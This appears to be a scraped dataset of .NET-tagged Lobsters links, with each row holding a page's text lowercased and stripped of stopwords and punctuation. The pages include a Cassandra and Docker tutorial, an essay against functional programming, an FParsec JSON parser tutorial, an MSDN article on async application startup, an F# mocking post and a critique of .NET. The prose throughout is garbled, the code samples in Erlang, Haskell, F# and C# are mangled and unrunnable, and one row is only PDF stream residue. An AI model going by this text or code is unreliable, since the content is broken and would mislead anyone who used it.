mechanism data storage system cassandra query data partition key partition key given row might take one value whole consistent hash ring node cluster responsible storing data partition key within range hash ring using replication probably use node also storing replicated data node addition partition range responsibility query come cluster first thing happens determining node necessary data partition key let take look simple example want find information coffee shop located particular street following table create table coffeeshopsbystreet street text coffeeshop text hour text capacity int housenumber int openonweekend boolean primary key street coffeeshop clustering order coffeeshop asc let insert data table insert coffeeshopsbystreet street coffeeshop hour capacity housenumber openonweekend value misspelled name coffee shop couple time remove one inserted incorrectly insertion able run select query see result picture way know data look like tabular form actually way cassandra store data see hm nope look table stored internally see something like see difference data saved disk versus receive result cassandra tabular view mississippi alberta partition key highlighted yellow mean querying table using hash value determine node responsible partition see information mississippi key stored together picture partition according array row data partition stored mississippi partition store two actual coffee shop record one marked deletion displayed query table alberta street name also see timestamps storing data way cassandra make fast data stored together know partition key another thing might noticed partition key information stored row key value pair cell data example housenumber cell name cell value openonweekend cell name true cell value look table definition internal representation attentively might noticed column stored row key example coffeeshop column coffeeshop column clustering column remember cassandra primary key serf two purpose yes uniqueness satisfaction query table first rule column using equality clause query part partition key way cassandra know go look data inside cluster second rule primary key reflect uniqueness data entity word primary key consist partition key column define uniqueness data row mean table coffeeshopsbystreet make returned coffee shop unique leave primary key consist partition key street name attempt insert one new coffee shop table notice row added instead column corresponding particular street name rewritten new inserted value called upsert cassandra prevent happening correct data model correct data model case well know street name coffee shop name together one unique data entry returned parameter therefore coffee shop name part primary key fulfill uniqueness nt need support coffee shop name equality querying clause make coffee shop name clustering column clustering column cassandra special type column support inequality query like range query also allow sorting support cassandra store clustering column special way take look internal representation table row store clustering column information coffeeshop case keep row ordered one clustering column table stored row level internal representation table structure one important note working cassandra version le may notice introduction cassandra sstable format changed reduce data duplication include useful optimization information look quoting andrew tolbert member datastax cassandra team key differentiator storage format older verisons cassandra cassandra sstable previously representation partition cell identified clustering column name whereas cassandra sstable represents partition row using cassandracli utility see data stored disk good news cassandracli deprecated removed cassandra utility like also deprecated however still way look internals get feel data actually stored purpose use sstabletools download jar node machine use tojson command indicating data file want inspect like see result showing internal representation table anyway back table may wonder strange table coffeeshopsbystreet sound weird table coffeeshops street yes come relational world may find unusual quite logical table naming query let see easier explain know table look like inside cassandra search value query main practical purpose table cassandra satisfy query overall physical data modeling approach cassandra query based built around query access pattern conceptual data model let look little bit closer think application always object manipulate like coffee shop street case relationship object part independent particular database next step thinking thinking task operation performed object collaboration analysis important step output get list query executed database create cassandra next step create table almost query operation optimized query high speed however result data denormalization absolutely normal cassandra help query fast always find location data constant time denormalization also result necessity perform writes several table syncing table however performed atomic operation using batch nt mix good batch bad batch rdbms tradeoff low latency disk space cassandra tradesoff disk space low latency important note save brain cassandra primary key fulfil uniqueness equality querying purpose primary key consists partition key clustering column add uniqueness data entry partition key help cassandra find location data node fast clustering column allow sorting range query internally data table grouped partition allows store data partition key together inside partition collection row row store collection cell key value pair column name column value row clustering column stored cell inside partition row stored row level build table cassandra build entity tabular representation build satisfy query result data denormalization requires table synchronization writes result low query latency give little bit information internal structure cassandra storage mechanism persistent ordered immutable hashmap sstable writes occur go commit log immutable append data structure memtable stored ram like cache data memtable full flush happens flush content memtable moved disk sstable created period time compaction process triggered compaction operation combine several sstables disk one new sstable containing data removing old sstables basically implemented merge sort sstables read request come node gather information given partition key existing sstables including memtable information cassandra storage read docker cassandra cluster easily deployed use docker blog post created local cassandra cluster node machine using docker also use docker cloud environment like amazon google cloud start docker follow installation instruction docker website using mac installation kitematic docker quickstart terminal installed machine open kitematic see list available container need node cassandra yeah docker installed also installs virtualbox store container notice image named default created docker installed open docker quickstart terminal create cassandra node execute command docker run name nameofyournode cassandra able log cassandra instance execute command docker exec nameofyournode bash see cluster status nodetool status one node far normal state good need two node create node cluster first node need link together create two node use command docker run name nameofyournewnode link nameofyournode cassandra cassandra connect terminal node cluster run following command ensure within cluster nodetool status output something like node joining status uj j joining like node finally running normally log machine look etccassandracassandrayaml file inside machine time might want use terminal application allows broadcasting open tab window make typing faster using shell broadcast send output tab window menu item first need vim edit content config file let install aptget update aptget install vim open cassandrayaml vim vim etccassandracassandrayaml cheetsheet vim get lost command insertion saving command actually opening cassandrayaml file let go varlibcassandra directory remove directory want system clean directory recreated later open cassandrayaml opened type clustername press enter command search phrase redirect right line clustername default name cluster test cluster post really test cluster leave next setting interesting u listenaddress let search able see value listenaddress listen address node docker set accordingly need make sure set next setting rpcaddress search make sure rpcaddress value node ip address make easier type r hostname press enter output node ip address replace value ip address last one need change called seed seed special string need set node cluster contains ip address node gossiping allows aware cluster topology change related thing really small example cluster let set ip address node inside seed string big cluster nt make node seed best practice choose set node seed line look like seed done let save change wq command done cluster setup next step connect cluster fsharp first open necessary port fsharp able actually connect go kitematic container go port section set value port cassandra cql native transport port port opened try connect cassandra cluster fsharp connecting cassandra docker f option look section cassandra see one option choose work cassandra example use official cassandra net driver available link project strongly recommend investigate available driver option choose one suit best case using mac xamarin studio project scaffold example first step clone repo project scaffold location want create example git clone http githubcomfsprojectsprojectscaffoldgit look inside projectscaffold directory find bunch file including buildsh file paket directory execute buildsh command asked bunch question project name thing go step next thing want add dependency cassandra driver paket done pretty easily find lot information paket open paketdependencies file add line cassandra driver dependency run command install dependency solution paket install package directory contain necessary dependency rename projectscaffold directory something meaningful probably name indicated projectscaffold creation let open project xamarin studio create f module another fsx file edit scriptfsx file purpose post show connect cassandra cluster docker using fsharp inside scriptfsx file load dependency xamarin studio fsharp interactive window see output statement execute execute statement select line want run press ctrl enter mac xamarin studio let connect cluster indicate contact point cluster looking docker kitematic setting let try connect existing keyspace cassandra yay probably already guessed proceed creating data model running query sample let look create coffeeshopbystreet table run query let create keyspace example set replication setting keyspace level cluster three node let make replication factor equal need function display result query create table run following command prepare insert query want execute several time different parameter look result stored table insert execute query ordering rule clustering column output first second command full listing code
521,Lobsters,dotnet,"C#, F#, .NET programming",Microservices Weekly: Weekly Newsletter on microservices news and articles from around the community,http://www.microservicesweekly.com/,microservices weekly weekly newsletter microservices news article around community,subscribe collaborate enjoy,get free weekly dose microservice architecture containerbased virtualization news article around community take look latest microservices weekly issue subscribe keep important news microservice architecture nice summary email every week spam ever collaborate created quality content please share u include masterpiece article weekly newsletter enjoy sit relax mix drink enjoy finest content microservice architecture
522,Lobsters,dotnet,"C#, F#, .NET programming",Functional programming: A step backward,http://www.javaworld.com/article/2078610/java-concurrency/functional-programming--a-step-backward.html,functional programming step backward,alpha geek java functional programming feature store looping performed recursion andrew oliver compare ruby clojure ceylon share goal reach varying result learn work smarter harder infoworld roundup tip trend programmer need know developer survival guide download pdf today keep latest developer news infoworld developer world newsletter seemingly endless debate c optimizing compiler modern architecture dependencebased approach advanced compiler design implementation generate assembler objectoriented language general application software exactly opposite true martin fowler famously said fool write code computer understand good programmer write code human understand syntax functional programming nt readable glance couple code snippet show mean example erlang one haskell man versus machine gone wiring punch card assembler macro assembler c fancy macro assembler higherlevel language abstract away much old machine complexity step taken u little closer scene star trek iv baffled mr scott try speak instruction mouse hello computer decade progress making programming language easier human read understand functional programming syntax turn back clock functional programming address concurrency problem state often cost human readability functional programmming may entirely appropriate many circumstance ironically might even help bring computer human language closer together indirectly defining domainspecific language difficult syntax make extremely poor fit generalpurpose application programming nt jump bandwagon yet especially riskaverse project functional programming step backward infoworldcom latest development business technology news infoworld daily newsletter follow infoworld twitter,unless living rock know functional programming rage among socalled alpha geek perhaps already use functional programming language use conventional language like java c probably aware functional programming feature store brave new world upon u take thing far might good time pause reflect appropriateness functional programming everyday application developmentwhat functional programming simple answer everything mathematical function functional programming language object generally object immutable either argument return value function fornext loop imply state change instead type looping performed recursion passing function argument andrew oliver compare ruby clojure ceylon share goal reach varying result learn work smarter harder infoworld roundup tip trend programmer need know developer survival guide download pdf today keep latest developer news infoworld developer world newsletter functional programming language answer question complicated subject seemingly endless debate language attempt box functional programming style others encourage nt force issue traditional imperative language allow program functional style indeed people hard work adding support functional programming construct java c case functionalproponents often argue functional programming lead efficient software opponent argue reverse true find claim equally doubtful could easily convinced functional programming make writing compiler optimizers difficult jit compiler functional code slower equivalent compiler traditional code close mapping imperative programming language underlying hardware support nt exist functional language result compiler functional language work harderhowever good optimizer able translate functional programming closure tail call lambda expression equivalent loop expression traditional language may require work good page reading subject recommend optimizing compiler modern architecture dependencebased approach advanced compiler design implementation alternatively prove gcc compiler multiple front end generate assemblerthe better argument functional programming modern application involving highly concurrent computing multicore machine state problem imperative language including objectoriented language involve multiple thread changing shared state object deadlock stack trace lowlevel processor cache miss take place state problemthere many place functional programming functional programming language great fit probably best approach pure mathematical calculation functional programming actually clearer imperative programming business software general application software exactly opposite true martin fowler famously said fool write code computer understand good programmer write code human understand syntax functional programming nt readable glancea couple code snippet show mean example erlang module listsort export bylength list qsort list fun b b end qsort qsort pivotrest smaller qsort x x rest smaller x pivot smaller pivot qsort rest smaller pivot smaller one haskell file width x best x best col d case empty best col d char c c best col d text best col length d line n best d concat b best col b d union b nicest col best col d best col b d best nicest col b width least fit otherwise b least min width colman versus machineany halfway decent programmer quickly glean general intent imperative code even language never seen certainly figure functional routine looking may possible glance unlike imperative code functional code nt map simple language construct rather map mathematical constructswe gone wiring punch card assembler macro assembler c fancy macro assembler higherlevel language abstract away much old machine complexity step taken u little closer scene star trek iv baffled mr scott try speak instruction mouse hello computer decade progress making programming language easier human read understand functional programming syntax turn back clockfunctional programming address concurrency problem state often cost human readability functional programmming may entirely appropriate many circumstance ironically might even help bring computer human language closer together indirectly defining domainspecific language difficult syntax make extremely poor fit generalpurpose application programming nt jump bandwagon yet especially riskaverse projectsthis article functional programming step backward originally published infoworldcom follow latest development business technology news get digest key story day infoworld daily newsletter latest business technology news follow infoworld twitter
523,Lobsters,dotnet,"C#, F#, .NET programming",In the Age of Web: Typed Functional-First Programming Revisited,http://arxiv.org/pdf/1512.01896v1.pdf,age web typed functionalfirst programming revisited,,obj length filter flatedecode stream q e w u e x
524,Lobsters,dotnet,"C#, F#, .NET programming",OmniSharp - .NET and IntelliSense on any platform with your editor of choice,http://www.omnisharp.net/,omnisharp net intellisense platform editor choice,command line command line yeoman aspnet generator yeoman generator yeoman open issue,command line command line create project using yeoman aspnet generator download nuget npm bower resource dotnet restore build project using dotnet build run project command line dotnet run package project publishing dotnet pack yeoman generator getting started project easy using yeoman generator use get started generatoraspnet goal generatoraspnet provide experience consistent creating new aspnet dnx project file visual studio related generator may interested working related generator please open issue let u know add list close
525,Lobsters,dotnet,"C#, F#, .NET programming",Fparsec Tutorial,http://www.quanttec.com/fparsec/tutorial.html#,fparsec tutorial,jsonorg rfc json specification section,discussed basic fparsec well prepared work real world parser example json parser json javascript object notation data interchange format simple lightweight syntax find description syntax jsonorg rfc many application one deal json file describing one particular kind object context sometimes appropriate write specialized parser specific kind json file tutorial however follow general approach implement parser parse general json file ast ie intermediate data structure describing content file application conveniently query data structure extract information need approach comparable xml parser build data structure describing document tree xml document great advantage approach json parser becomes reusable document specific parsing logic expressed form simple function processing ast json document natural way implement ast f help discriminated union type look json specification see json value string number boolean null list value square bracket object sequence pair curly bracket parser use following union type represent json value type json jstring string jnumber float jbool bool jnull jlist json list jobject map string json chosen f list type represent sequence value map type represent sequence pair type particularly convenient process f note json type recursive since jlist jobject value contain json value parser reflect recursive structure tip new fparsec little time would good exercise try implement json parser help reference documentation tutorial already covered almost everything need json grammar simple enough take much time course always peek implementation get stuck start actual parser implementation covering simple null boolean case let jnull stringreturn null jnull let jtrue stringreturn true jbool true let jfalse stringreturn false jbool false handling number case simple json number format based typical number format used many programming language hence parsed pfloat parser let jnumber pfloat jnumber note f allows u pas object constructor jnumber function argument compare precise number format supported pfloat json spec see pfloat support superset json format contrast json format pfloat parser also recognizes nan infinity value accepts leading plus sign accepts leading zero even support hexadecimal float format java depending context behaviour considered feature limitation parser application probably matter json rfc clearly state json parser may support superset json syntax however rather support exact json number format implement float parser rather easily based configurable numberliteral parser look currently done pfloat source json string format take little effort implement already parsed similar format stringliteral parser section adapt one parser purpose let str pstring let stringliteral let escape anyof bfnrt function b b f n n r r c string c every char mapped let unicodeescape convert hex char integer number let c int c int c str u hex hex hex hex fun char string let escapedcharsnippet str escape unicodeescape let normalcharsnippet manysatisfy fun c c c str str stringssepby normalcharsnippet escapedcharsnippet let jstring stringliteral jstring stringliteral par string literal sequence normal char snippet separated escaped char snippet normal char snippet sequence char contain char escaped char snippet consists backslash followed char b f n r unicode escape unicode escape consists u followed four hex char representing code point grammar rule json list object recursive list object contain kind json value hence order write parser list object grammar rule need way refer parser kind json value even though yet constructed parser like often computing solve problem introducing extra indirection let jvalue jvalueref createparserforwardedtoref json unit might guessed name createparserforwardedtoref creates parser jvalue forward invocation parser reference cell jvalueref initially reference cell hold dummy parser since reference cell mutable later replace dummy parser actual value parser finished constructing json rfc sensibly permit space horizontal tab line feed carriage return whitespace character allows u use space parser parsing whitespace let w space json list object syntactically represented list element bracket whitespace allowed bracket comma list element conveniently parse list following helper function let listbetweenstrings sopen sclose pelement f str sopen str sclose w sepby pelement w str w f function take four argument opening string closing string element parser function applied parsed list element help function define parser json list follows let jlist listbetweenstrings jvalue jlist json object list pair need parser pair let keyvalue stringliteral w str w jvalue remember point side indicate result two parser side returned tuple passing keyvalue parser listbetweenstrings obtain parser json object let jobject listbetweenstrings keyvalue mapoflist jobject defined parser possible kind json value combine different case choice parser obtain finished parser json value jvalueref choice jobject jlist jstring jnumber jtrue jfalse jnull jvalue parser accept leading trailing whitespace need define parser complete json document follows let json w jvalue w eof parser try consume complete json input stream successful return json ast input parser result finished json parser want try parser sample input please take look json project sample folder
527,Lobsters,dotnet,"C#, F#, .NET programming",What is the C# equivalent of map function in Haskell?,http://stackoverflow.com/questions/2142935/what-is-the-c-sharp-equivalent-of-map-function-in-haskell,c equivalent map function haskell,,
528,Lobsters,dotnet,"C#, F#, .NET programming",Is SQL a good place for business logic?,http://enterprisecraftsmanship.com/2015/11/11/is-sql-a-good-place-for-business-logic/,sql good place business logic,http enterprisecraftsmanshipcompostsissqlgoodplaceforbusinesslogic,http enterprisecraftsmanshipcompostsissqlgoodplaceforbusinesslogic
530,Lobsters,dotnet,"C#, F#, .NET programming",Async from the Start,https://msdn.microsoft.com/en-us/magazine/mt620013.aspx,async start,article asynchronous programming async start mark sowul msdncomasync first step figure figure figure toward objectoriented startup figure decoupling application form figure figure pulling hosting environment figure figure longawaited asynchrony exception handling payoff figure wrapping msdncomasync mark sowul mark solsoftsolutionscom,minute read article november volume number asynchronous programming async start mark sowul recent version microsoft net framework make easier ever write responsive highperformance via async await exaggeration say changed way net developer write software asynchronous code used require impenetrable web nested callback written understood almost easily sequential synchronous code ample material already creating consuming async method assume familiar basic visual studio documentation page msdncomasync get speed documentation async warns plug async method existing code caller need async word lucian wischik developer microsoft language team like zombie build async fabric application right beginning without resorting async void going show course several refactorings default ui startup code window form window presentation foundation wpf transforming ui boilerplate objectoriented design adding support asyncawait along way also explain make sense use article main walkthrough focus window form wpf requires additional change get distracting step first explain change window form application discus difference needed wpf version show basic code change article see completed example intermediate revision environment accompanying online code download first step visual studio template window form wpf application really lend using async startup customizing startup process general although c strives objectoriented code default startup code nudge developer toward placing logic static method alongside main overly complicated constructor main form good idea access database inside mainform constructor yes seen done situation always problematic async also mean clear opportunity application initialize asynchronously start created new project window form application template visual studio figure show default startup code programcs figure default window form startup code static class program â summary â main entry point application â summary â stathread â static void main â â â â applicationenablevisualstyles â â â applicationsetcompatibletextrenderingdefault false â â â applicationrun new â easy wpf default wpf startup quite opaque even finding code customize difficult put initialization code applicationonstartup would delay showing ui loaded necessary data first thing need wpf expose startup process code edit get wpf starting point window form step article similar creating new wpf application visual studio create new class called program code figure replace default startup sequence open project property change startup object newly created figure equivalent window presentation foundation startup code static class program â summary â main entry point application â summary â stathread â static void main â â â â app app new app â â â applies xaml eg startupuri applicationresources â â â appinitializecomponent â â â show window specified startupuri â â â apprun â use call initializecomponent figure see compiler generates equivalent main code use app startup object open toward objectoriented startup first small refactoring default startup code push objectoriented direction take logic main move class make program nonstatic class said default push wrong direction give constructor move setup code constructor add start method run form called new version see figure skeleton show core idea run program main creates object call method typical objectoriented scenario figure beginning objectoriented startup stathread static void main â p new â pstart â private readonly mmainform private â applicationenablevisualstyles â applicationsetcompatibletextrenderingdefault false â â mmainform new â public void start â applicationrun mmainform decoupling application form nevertheless call applicationrun take form instance end start method pose problem one generic architectural concern like tie lifetime displaying form would ok many application application run background display ui start except maybe icon taskbar notification area know seen briefly flash screen launch disappearing bet startup code follows similar process hide soon possible form finished loading admittedly particular problem necessary solve separation critical importance initializing asynchronously instead applicationrun mmainform use overload run take argument start ui infrastructure without tying particular form decoupling mean show form also mean closing form longer quit app need wire explicitly shown figure also use opportunity add first hook initialization method creating form class hold logic need initializing retrieving data database web site figure message loop separate main form private â applicationenablevisualstyles â applicationsetcompatibletextrenderingdefault false â â mmainform new â mmainformformclosed mmainformformclosed â void mmainformformclosed object sender formclosedeventargs e â applicationexitthread â public void start â mmainforminitialize â mmainformshow â applicationrun wpf version startupuri determines window show run called see defined appxaml markup file unsurprisingly application default shutdownmode setting onlastwindowclose shuts application wpf window closed lifetime get tied together note differs window form window form main window open child window close first window application exit wpf exit unless close window accomplish separation wpf first remove startupuri appxaml instead create window initialize show call apprun public void start â mainwindow mainform new mainwindow â mainforminitialize â mainformshow â mapprun create application set appshutdownmode shutdownmodeonexplicitshutdown decouples application lifetime window â mapp new app mappshutdownmode shutdownmodeonexplicitshutdown mappinitializecomponent accomplish explicit shutdown attach event handler mainwindowclosed course wpf better job separating concern make sense initialize view model rather window create mainviewmodel class create initialize method similarly request close app also go view model add event corresponding method view model resulting wpf version listed figure main unchanged show figure class window presentation foundation version private readonly app mapp private â mapp new app â mappshutdownmode shutdownmodeonexplicitshutdown â mappinitializecomponent â public void start â mainviewmodel viewmodel new mainviewmodel â viewmodelcloserequested viewmodelcloserequested â viewmodelinitialize â â mainwindow mainform new mainwindow â mainformclosed sender e â â â â viewmodelrequestclose â â â â â â â mainformdatacontext viewmodel â mainformshow â mapprun â void viewmodelcloserequested object sender eventargs e â mappshutdown pulling hosting environment separated applicationrun form want handle another architectural consideration right application deeply embedded program class want hosting environment speak going remove various window form method application program class leaving functionality related program shown figure one last piece add event program class link closing form shutting application le direct notice class interaction application â figure easy plug elsewhere private readonly mmainform private â mmainform new â mmainformformclosed mmainformformclosed â public void start â mmainforminitialize â mmainformshow â public event eventhandler eventargs exitrequested void mmainformformclosed object sender formclosedeventargs e â onexitrequested eventargsempty â protected virtual void onexitrequested eventargs e â exitrequested null â â â exitrequested e separating hosting environment benefit one make testing easier test limited extent also make easier reuse code elsewhere perhaps embedded larger application screen decoupled main shown figure moved application logic back design make easier integrate wpf window form perhaps gradually replace window form wpf outside scope article find example mixed application accompanying online code prior refactoring nice thing necessarily crucial relevance hand speak going make asynchronous version flow naturally soon see figure main able host arbitrary program stathread static void main â applicationenablevisualstyles â applicationsetcompatibletextrenderingdefault false â â p new â pexitrequested pexitrequested â pstart â â applicationrun â static void pexitrequested object sender eventargs e â applicationexitthread longawaited asynchrony finally payoff make start method asynchronous let use await make initialization logic asynchronous per convention renamed start startasync initialize initializeasync also changed return type async task public async task startasync â await mmainforminitializeasync â mmainformshow use main change like static void main â â pexitrequested pexitrequested â task programstart pstartasync â â applicationrun order explain solve subtle important need explore detail going asyncawait true meaning await consider startasync method presented important realize typically async method reach await keyword return executing thread continues would method return case startasync method reach return main continues calling applicationrun lead somewhat counterintuitive result applicationrun likely execute mmainformshow even though sequentially occurs mmainformshow async await make asynchronous programming easier still mean easy async method return task task completing represents async method intuitive sense namely code run case startasync mean completed initializeasync mmainformshow first problem using async void without task object way caller async void method know finished executing rest code run thread moved startasync already returned caller applicationrun come applicationrun infinite loop waiting work processing ui event example move mouse window click button applicationrun message loop dequeue event dispatch appropriate code response wait next event come strictly limited ui though consider controlinvoke run function ui thread applicationrun processing request case initializeasync completes remainder startasync method posted message loop use await applicationrun execute rest method ui thread written callback using controlinvoke whether continuation occur ui thread controlled configureawait read stephen march article best practice asynchronous programming important separate applicationrun mmainform applicationrun running show need running order process code even actually showing ui example try moving applicationrun main back startasync program quit immediately execution hit initializeasync control return main code run end main also explains use async start bottom common shortlived antipattern call taskwait instead await caller async method likely deadlock immediately problem ui thread blocked call wait unable process continuation without continuation task complete call wait never await applicationrun chicken egg problem mentioned earlier subtle problem described call await default behavior continue execution ui thread need however infrastructure set first call await appropriate code run yet synchronizationcontextcurrent key behavior calling await infrastructure capture value synchronizationcontextcurrent us post continues ui thread synchronization context set window form wpf start running message loop inside startasync happened yet examine synchronizationcontextcurrent beginning startasync see null synchronization context await post continuation thread pool instead going ui thread going work wpf version hang outright turn window form version work default window form set synchronization context first control case construct mmainform behavior controlled windowsformssynchronizationcontextautoinstall occurs create form ok put await call creating mmainform however problem solution set synchronization context beginning follows stathread static void main â applicationenablevisualstyles â applicationsetcompatibletextrenderingdefault false â synchronizationcontextsetsynchronizationcontext â â â new windowsformssynchronizationcontext â â p new â wpf equivalent call synchronizationcontextsetsynchronizationcontext â new dispatchersynchronizationcontext exception handling almost still another lingering problem root application initializeasync raise exception program handle programstart task object contain exception information nothing done application hung sort purgatory could startasync could catch exception main use await main async illustrates second problem async void way properly catch exception thrown async void method caller access task object use async void typical guidance say async void limited mostly event handler march article mentioned discus recommend reading get asyncawait â normal circumstance taskschedulerunobservedexception deal task raise exception subsequently handled problem guaranteed run situation almost certainly task scheduler detects unobserved exception task finalized finalization happens garbage collector run garbage collector run need satisfy request memory may see going case exception result application sitting around nothing request memory garbage collector run effect app hang fact wpf version hang specify synchronization context wpf window constructor throw exception window created nonui thread exception go unhandled final piece deal programstart task add continuation run case error case make sense quit application initialize use await main async create new async method solely purpose exposing handling exception thrown asynchronous startup consist trycatch around await method handling exception throwing new one another limited case async void make sense private static async void handleexceptions task task â try â â â â await task â â catch exception ex â â â â log exception show error user etc â â â applicationexit â main us follows task programstart pstartasync handleexceptions programstart applicationrun course usual subtle issue asyncawait make thing easier imagine hard used said earlier typically async method reach call await return remainder method run continuation case though task complete synchronously case execution code get broken performance benefit happens though mean handleexceptions method run entirety return applicationrun follow case exception call applicationexit occur call applicationrun effect want force handleexceptions run continuation need make sure applicationrun anything else way exception know applicationrun already executing applicationexit properly interrupt taskyield force current async code path yield caller resume continuation correction handleexceptions private static async void handleexceptions task task â try â â â â force yield caller applicationrun executing â â â await taskyield â â â await task â â case call handleexceptions return applicationrun execute remainder handleexceptions posted continuation current synchronizationcontext mean picked applicationrun incidentally think taskyield good litmus test understanding asyncawait understand use taskyield probably solid understanding asyncawait work payoff everything working time fun going show easy add responsive splash screen without running separate thread fun splash screen quite important application right away user launch application see anything happen several second bad user experience starting separate thread splash screen inefficient also marshal call properly thread providing progress information splash screen therefore difficult even closing requires call invoke equivalent moreover splash screen finally close usually properly give focus main form impossible set ownership splash screen main form different thread compare simplicity asynchronous version shown figure figure adding splash screen startasync public async task startasync â using splashscreen splashscreen new splashscreen â â â â user close splash screen quit would also â â â good opportunity set cancellation token â â â splashscreenformclosed mmainformformclosed â â â splashscreenshow â â â â mmainform new â â â mmainformformclosed mmainformformclosed â â â await mmainforminitializeasync â â â â ensures activation work â â â splash screen go away main form activated â â â splashscreenowner mmainform â â â mmainformshow â â â â splashscreenformclosed mmainformformclosed â â â splashscreenclose â wrapping shown apply objectoriented design startup window form easily support asynchronous initialization also shown overcome subtle problem come asynchronous startup process actually making initialization asynchronous afraid find guidance msdncomasync enabling use async await start program objectoriented feature become straightforward implement process commandline calling appropriate method program class user log showing main window start app notification area without showing window startup usual objectoriented design provides opportunity extend reuse functionality code mark sowulâ may fact software simulation written c folk speculate devoted net developer since beginning sowul share wealth architecture performance expertise net microsoft sql server via new york consulting business solsoft solution reach mark solsoftsolutionscom sign occasional email software insight thanks following microsoft technical expert reviewing article stephen cleary james mccaffrey
531,Lobsters,dotnet,"C#, F#, .NET programming",MCG: Visual Functional Programming,http://area.autodesk.com/blogs/chris/mcg-visual-functional-programming,mcg visual functional programming,blog,blog read latest post stay current favorite industry area blog cover game film vfx design visualization vr focusing autodesk max maya flame maya lt max flame maya maya lt motionbuilder mudbox shotgun arnold bifrost maya unity vr design motion
532,Lobsters,dotnet,"C#, F#, .NET programming",F# Unit Testing With SimpleMock,http://steveshogren.github.io/f-number-unit-testing/,f unit testing simplemock,simplemock pattern simplemock f module bonus simplemock fake helper double bonus use class instead record,considering using f might curious handle unit test mocking especially want use module class language like c java common method di container handmade constructor injection class entry point allow unit test replace real dependency testonly replacement previously posted example show much simpler way inject dependency called simplemock pattern simplemock pattern also used f even using module simplemock f module assume mocking inside module class mocking inside f class would look much c showed simplemock post sample program work persists result let addandsave x let sum x dbmodulesavesum sum sum apply simplemock pattern use argument currying adding simple function wrapper let addandsave savesum x let sum x savesum sum sum let addandsave addandsave dbmodulesavesum test code let addandsavetest let calledvar ref let result addandsave fun sum calledvar sum assertareequal result assertareequal calledvar started renaming addandsave function trailing created new addandsave call addandsave correct dependency first argument leaving rest argument called later currying allows ability new addandsave function need x parameter test time called addandsave passing needed dependency using lambda fake injection close dependency use possible bonus simplemock fake helper earlier replacement dbmodulesavesum bit complex show u many time fake called easily make helper take parameter return called along withe count time called type testfakeresults member val timescalled get set member val args obj list get set let makefakeonearg let result new testfakeresults let fake fun resultsargs resultsargs resultstimescalled resultstimescalled fake result code might hard comprehend first made generic helper create single argument fake need return tuple containing fake lambda instance testfakeresults fake lambda populate testfakeresults access test via second arg tuple rewrite previous test using makefakeonearg test code let addandsavetest let fakesave fakesavecalling makefakeonearg let result addandsave fakesave assertareequal result assertareequal fakesavecallingargs assertareequal fakesavecallingtimescalled testfakeresults return information way called including list argument felt needed extra expressiveness could also use mocking library like rhinomocks moq testfakeresults constructor essential pattern important part learning unit test f confidence double bonus use class instead record first wrote post used record instead class testfakeresults type bitten functional programming bug might wondered usage mutable class two alternate makefakeonearg use record probably see switched class type testfakeresults timescalled int args obj list using record alternate let let ref let obj list ref ref let fake fun fake fun testfakerecordtimescalled args using record alternate let let result ref testfakerecordtimescalled args let fake fun result timescalled result timescalled args result args fake fun result way use record delay construction via lambda must executed test code complex need mutable data structure access via reference record approximate using trick ultimately find alternative complex justify use sometimes mutable data structure best choice solve problem efficiently power f give u ability choose best tool job record immutability class mutability
533,Lobsters,dotnet,"C#, F#, .NET programming",Why I Left the .NET Framework,http://blog.jonathanoliver.com/why-i-left-dot-net/,left net framework,good csharp hefty percentage developer using language resharper resharper bdd mspec goconvey multilanguage runtime nuget mono cqrs event sourcing bad recent development platform migration window covered previously quickly visual studio source control sourcetree mono dead last bottom pack slow ii slow side closemindedness performance killer sql server behavior conclusion,net framework good really good nt leave net short constrained ability choose huge deal turned focus inward toward perceived safety nest instead helping u experience possibility big wide world buckle post pratically become book length good first let start saying whole lot thing net right albeit thing net came net community csharp c awesome think spectacular language coming strong c background thoroughly enjoy syntax flow feel language yes thing would change general solid language hefty percentage developer using language preeminence window operating system great language know resharper also love resharper guy jetbrains miracle worker without resharper related tool might enjoyed c much bdd mspec also really enjoyed bddstyle framework called machinespecifications mspec short spectacular testing framework really encourages correct language test mspec test mess really got way additionally mspec huge inspiration incentive organization created goconvey golangbased bdd testing framework multilanguage runtime think concept multilanguage clr really got jvm world thinking aware nonjava jvm language prior clr advent common language runtime understanding got people jvm moving ultimately creating great jvm language scala clojure please correct wrong clr made sun guy sit take notice java bit stale catching many way advent java competition good thing nuget another obvious one nuget package management story window whole specifically within window development terrible nuget solves lot problem lot thing right borrowing heavily python ruby room improvement sure nt felt lot pain nuget select package upgrade mono ca nt speak highly enough mono guy created nothing short amazing without official support despite potential legal issue hanging head pushed forward created incredibly capable alternative official runtime implementation several application running production almost year mono without issue production ready may depend application see mono cqrs event sourcing arguably one best thing net birthplace cqrs correlated technique event sourcing granted cqrses nothing terribly new greg young tell bunch stuff repackaged rebranded u pretty serious problem large codebase cqrses quite literally unshackled domain came across five year ago cqrses named pattern growth phenomenal perhaps one thing net able share development community aside innovation coming outside bad good stuff way let look wrong left net framework thing excites recent development platform migration take lot best part leaving bad stuff found behind window covered previously window good player come networkbased server software one really big problem see window traditional window devs typically good window get lost quickly outside comfort zone true linux devs computing much bigger window one problem devs capable single o inevitably lead proliferation window word window begets window way break cycle nix guy hand typically familiar multiple operating system linux unix osx window etc inner working o various distribution debian fedorabased window manager lowercase w desktop manager file system package management compiling recompiling repackaging command line fu list go one pet peeve mine file system ntfs file system hardly best given task zfs btrfs reiserfs ext etc really cool property also love able create loopback device bash creating ram drive various highspeedtransient disk operation nt happen window without thirdparty software aws cloud firing window box take good minute fire simple linux box second come cloud scaling really important able scale quickly minute eternity scaling important visual studio another thorn side visual studio fact need big honkin ide real development bother big resource hog window core desktop built gb ram vertex gb ssd literally maxed window experience index window v still slow yes resharper make slower resharper worth dev macbook pro le cpu horsepower beefy desktop thing noticebly faster ux infinitely better small learning curve fact nt even use mouse anymore hand always keyboard trackpad gesture computer actually respond unlike window one cool thing v debugger incredibly handy see use every often would report wrong value watch window caused hour debugging time also big negative default multithreaded world clr caused need debugger first place debugger actually liberating experience force code different way v also really nasty habit creating csproj sln file hate thing sure c know build get golang reference code using import statement nt project file net land could probably coded c using simple text editor fluent language file also really nasty habit creating wonderful merge conflict git rebase operation nt get started line break difference ca nt believe still dealing kind thing today v solution file linux line ending would nt load solution double clicking v solution file parser could nt read source control fortunately jumped microsoft camp source control early visual source safe using subversion early v lost commits umpteenth time git came around fascinated unfortunately window port typical occurrence finally someone created port nt looked back git sharp knife wield properly powerful effective tool used tfs small job monster like everything else redmond infected project file contaminated source directory yuck thank give command line git day perhaps sourcetree need little love gui mono yes second entry mono amazing mono still secondclass citizen net world whenever try get anything serious run mono 